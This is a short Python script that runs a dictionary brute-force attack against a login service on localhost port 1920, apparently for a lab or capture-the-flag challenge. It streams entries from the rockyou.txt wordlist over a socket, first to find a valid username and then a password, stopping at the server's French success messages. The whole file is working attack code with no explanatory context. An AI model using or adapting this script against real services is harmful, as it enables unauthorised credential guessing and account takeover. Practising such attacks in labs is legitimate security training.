import socket
import time

host,port= "127.0.0.1", 1920

s=socket.socket()
s.connect((host,port))

for ligne in open('rockyou.txt', 'r'):
	time.sleep(0.001)
	s.send(str(ligne[:-1]).encode("utf-8"))
	if s.recv(512).decode() == "User correct !":
		break

for ligne in open('rockyou.txt', 'r'):
	time.sleep(0.001)
	s.send(str(ligne[:-1]).encode("utf-8"))
	if s.recv(512).decode() == "Connexion réussie !":
		print("Connexion réussie !")
		break

s.close()
